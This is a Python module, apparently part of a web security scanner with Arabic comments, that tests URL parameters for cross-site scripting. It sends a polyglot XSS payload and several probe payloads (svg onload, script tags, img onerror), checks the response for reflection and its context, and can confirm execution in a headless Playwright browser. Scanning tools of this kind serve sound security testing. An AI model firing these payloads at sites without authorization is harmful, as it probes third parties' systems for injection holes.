"""فحص XSS: حمولة متعددة اللغات (polyglot) + كاشف انعكاس دقيق (بحث عن
العلامات المميزة في الرد) + تحليل السياق (سمة/نص/JS) + خيار DOM عبر Playwright.
"""
import html
import random
import re
import urllib.parse

from ...core.state_manager import Finding

POLYGLOT = (
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e"
)

PROBES = [
    '"><svg/onload=alert(1)>',
    "'-alert(1)-'",
    "';alert(1);//",
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "<svg/onload=alert(1)>",
    "<iframe/src/onload=alert(1)>",
]

MARKERS = ["alert(1)", "onerror=", "onload=", "<script>", "<svg", "javascript:alert"]


class XSSSwarm:
    def __init__(self, policy: dict):
        self.policy = policy
        cfg = policy["modules"]["xss"]
        self.dom_check = cfg.get("dom_check", False)
        self.polyglot = cfg.get("polyglot", True)

    # ------------------------------------------------------------------ reflection
    def _reflected(self, body: str, payload: str) -> bool:
        """البحث عن انعكاس مع تطبيع HTML (فك الترميز/التهريب)."""
        candidates = [payload]
        candidates.append(html.unescape(payload))
        candidates.append(payload.replace("%0A", "").replace("%0d", ""))
        try:
            candidates.append(urllib.parse.unquote(payload))
        except Exception:
            pass
        for c in candidates:
            if c and c in body:
                return True
        return False

    def _context(self, body: str, marker_pos: int) -> str:
        """تخمين سياق الانعكاس حول العلامة: داخل تسمية؟ سمة؟ نص؟ script؟"""
        before = body[max(0, marker_pos - 200): marker_pos]
        if re.search(r"<script[^>]*>", before, re.I) and "</script>" not in before.split("<script")[-1]:
            return "js"
        if re.search(r"<[a-z][^>]*\s[a-z-]+\s*=\s*[\"']?$", before, re.I):
            return "attr"
        if re.search(r"<[a-z]", before[-80:], re.I):
            return "tag"
        return "text"

    # ------------------------------------------------------------------ detectors
    async def _reflected_scan(self, transport, url: str, param: str) -> Finding | None:
        payloads = list(PROBES)
        if self.polyglot:
            payloads.append(POLYGLOT)
        for payload in payloads:
            sep = "&" if "?" in url else "?"
            probe = f"{url}{sep}{urllib.parse.quote(param)}={urllib.parse.quote(payload)}"
            r = await transport.get(probe)
            if r.status not in (200, 302):
                continue
            body = r.text
            pos = body.find(payload)
            if pos == -1:
                pos = body.find(html.unescape(payload))
            if pos != -1 and self._reflected(body, payload):
                ctx = self._context(body, pos)
                severity = "high" if ctx in ("js", "tag") else "medium"
                return Finding(
                    type="xss", severity=severity, url=url, param=param,
                    payload=payload,
                    evidence=f"انعكاس في سياق «{ctx}» (HTTP {r.status})",
                    confidence=0.9 if ctx != "text" else 0.7,
                )
        return None

    async def _dom_scan(self, transport, url: str, param: str) -> Finding | None:
        """فحص DOM عبر Playwright (متصفح حقيقي): تنفيذ فعلي للحمولة."""
        if not self.dom_check:
            return None
        try:
            from playwright.async_api import async_playwright  # استيراد متأخر
        except ImportError:
            return None
        payload = "';alert(1);//"
        sep = "&" if "?" in url else "?"
        probe = f"{url}{sep}{urllib.parse.quote(param)}={urllib.parse.quote(payload)}"
        try:
            async with async_playwright() as pw:
                browser = await pw.chromium.launch(headless=True)
                page = await browser.new_page()
                dialogs = []
                page.on("dialog", lambda d: (dialogs.append(d.message), d.accept()))
                await page.goto(probe, wait_until="load", timeout=15000)
                await page.wait_for_timeout(1200)
                await browser.close()
            if any("1" in d for d in dialogs):
                return Finding(
                    type="xss", severity="critical", url=url, param=param,
                    payload=payload, evidence=f"نافذة alert أُطلقت في DOM: {dialogs}",
                    confidence=0.98,
                )
        except Exception:
            pass
        return None

    # ------------------------------------------------------------------ entry
    async def __call__(self, cell, task, ctx) -> list[Finding]:
        findings = []
        url = task.url
        params = task.extra.get("params") or []
        if not params:
            qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            params = list(qs.keys())
        for param in params:
            if ctx.stop_event.is_set():
                break
            f = await self._reflected_scan(cell.transport, url, param)
            if f:
                findings.append(f)
            if self.dom_check and not f:
                f = await self._dom_scan(cell.transport, url, param)
                if f:
                    findings.append(f)
        return findings
